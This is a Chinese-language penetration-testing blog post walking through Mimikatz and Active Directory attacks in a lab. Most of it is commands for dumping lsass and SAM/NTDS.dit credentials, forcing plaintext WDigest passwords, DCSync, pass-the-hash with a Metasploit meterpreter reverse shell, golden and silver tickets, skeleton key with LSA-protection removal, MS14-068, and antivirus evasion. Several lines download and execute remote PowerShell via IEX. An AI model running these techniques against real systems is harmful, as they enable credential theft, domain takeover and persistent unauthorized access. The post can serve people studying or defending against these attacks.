---
categories:
    - 内网
tags:
    - Mimikatz
    - 内网
---
##  实验环境

```
win2012 
mimikatz 2.1.1
```
## 简介

Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！

注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。

## 使用powershell

Invoke-Mimikatz.ps1下载地址
```
https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
```

使用powershell 下载并执行

```
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/01.png)
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/02.png)

读取密码hash值

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/03.png)

## 本地mimikatz使用

### 本地执行
下载mimikatz，使用管理员运行

```
#提升权限
privilege::debug
#抓取密码
sekurlsa::logonpasswords
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/04.png)

当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。

cmd修改注册表命令：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
### SAM表获取hash

```
#导出SAM数据
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SAM SAM

#使用mimikatz提取hash
lsadump::sam /sam:SAM /system:SYSTEM
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/05.png)
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/06.png)

### Procdump+Mimikatz
当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:

下载地址：

```
https://download.sysinternals.com/files/Procdump.zip
```
运行Procdump导出lsass.exe，将lsass.dmp下载到本地后，然后执行mimikatz:

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/07.png)
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/08.png)


为了方便复制与查看，可以输出到本地文件里面：

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit > pssword.txt
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/09.png)

win10 也可以

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/10.png)
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/11.png)

## 域内mimikatz使用
### 读取域控中域成员Hash
域管理员身份执行mimikatz

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/12.png)

```
#提升权限
privilege::debug

抓取密码
lsadump::lsa /patch
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/13.png)

方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：

```
#获取所有域用户
lsadump::dcsync /domain:test.com /all /csv

#指定获取某个用户的hash
lsadump::dcsync /domain:test.com /user:test
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/14.png)

###  导出域成员Hash
域账户的用户名和hash密码以域数据库的形式存放在域控制器的 `%SystemRoot%\ntds\NTDS.DIT` 文件中。
这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库：

```
#创建快照
ntdsutil snapshot "activate instance ntds" create quit quit

#加载快照
ntdsutil snapshot "mount {快照集}" quit quit

#Copy文件副本
copy C:\路径\windows\NTDS\ntds.dit c:\ntds.dit
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/15.png)
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/16.png)

利用工具dump出hash,工具地址：

```
https://github.com/zcgonvh/NTDSDumpEx/releases
```
使用

```
NTDSDumpEx -d ntds.dit -o domain.txt -s system.hiv    (system.hive文件获取:reg save hklm\system system.hiv)
NTDSDumpEx -d ntds.dit -o domain.txt -r               (此命令适用于在域控本地执行)
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/17.png)
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/18.png)

最后记得卸载删除快照：

```
ntdsutil snapshot "unmount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit
ntdsutil snapshot "delete  {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/19.png)

### secretsdump脚本直接导出域hash
为什么要再提一遍secretsdump呢，因为它可以直接导出
(本地域控没py环境，不做了)
```
python secretsdump.py administrator:abc123!@192.168.28.10
```
首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功

### 哈希传递攻击PTH
###  工作组环境
当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。

```
#使用administrator用户的NTLM哈希值进行攻击
sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9
```
在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/20.png)

注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。

### 域环境

在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值

```
privilege::debug
#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击
sekurlsa::pth /user:administrator /domain:"xie.com" /ntlm:dbd621b8ed24eb627d32514476fac6c5 
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/21.png)

## MSF进行哈希传递
Copy有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 `exploit/windows/smb/psexec` 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。

```
msf > use  exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set lhost 192.168.10.27
msf exploit(psexec) > set rhost 192.168.10.14
msf exploit(psexec) > set smbuser Administrator
msf exploit(psexec) > set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了
msf exploit(psexec) > exploit 
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/22.png)

## 票据传递攻击(PTT)
### 黄金票据
域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。

首先获取krbtgt的用户hash:


```
mimikatz "lsadump::dcsync /domain:test.com /user:krbtgt"
```
利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值、krbtgt的ntlm，如下：

```
kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/23.png)
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/24.png)

## 白银票据
黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信

白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信

```
#在域控上导出 DC$ 的 HASH
mimikatz log "privilege::debug" "sekurlsa::logonpasswords"

#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据
kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt

#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统
dir \\DC.ABC.COM\C$
```
（没做）
### skeleton key
skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。


```
#在域控上安装 skeleton key
mimikatz.exe privilege::debug "misc::skeleton"

#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz
net use \\WIN-9P499QKTLDO.adtest.com\c$ mimikatz /user:adtest\administrator
```
微软在 2014 年 3 月 12 日添加了 LSA 保护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。

```
#适用系统
windows 8.1
windows server 2012 及以上
```
当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:

```
privilege::debug
!+
!processprotect /process:lsass.exe /remove 
misc::skeleton
```
##  MS14-068
工具地址：

```
https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068
```

当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。

MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。

```
systeminfo |find "3011780"
#为空说明该服务器存在MS14-068漏洞
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/25.png)

查看是否是域管理员,bypass是域用户

```
net user bypass /domain
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/26.png)

使用`dir \\WIN-SERVER-DC.test.com\c$`
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/27.png)

域用户hack在域成员主机A上登录过，域成员主机A的管理员通过mimikatz得到了域用户hack的用户名，密码，SID等值，而且域控存在MS14-068漏洞，现在域成员主机A想通过MS14-068漏洞访问域控。

1. 以下命令将生成 bypass@test.com 票据:

```
#MS14-068.exe -u 域用户@test.com -p 域用户密码 -s 域用户SID只 -d 域控ip
MS14-068.exe -u hack@test.com -p abc123! -s S-1-5-21-2189311154-2766837956-1982445477-1110 -d 192.168.28.10   
```
(这里因为发现bypass用户不是管理员权限，所以提了下权)
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/28.png)

在mimikatz中导入票据:
```
##清除内存中的票据信息
kerberos::purge
## 将高权限票据导入
kerberos::ptc 票据路径
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/29.png)
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/30.png)

验证是否成功:
（这里环境搞崩了，应该结果是对的，另外我在win2012r2 6.3没成功）
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/31.png)

## 免杀处理

```
poweshell.exe Import-Module .\Out-EncryptedScript.ps1
poweshell.exe Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password 密码 -Salt 随机数
#默认生成的文件是evil.ps1

-Password   设置加密的密钥
-Salt       随机数，防止被暴力破解
```
将加密生成的evil.sp1脚本放在目标机上，执行如下命令：

```
#远程加载解密脚本
poweshell.exe 
IEX(New-Object Net.WebClient).DownloadString("http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1")

[String] $cmd = Get-Content .\evil.ps1
Invoke-Expression $cmd
$decrypted = de password salt
Invoke-Expression $decrypted
Invoke-Mimikatz
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-8-27/32.png)

## 学习参考：
大佬nb，就完事了
```
https://www.cnblogs.com/-mo-/p/11890232.html
```
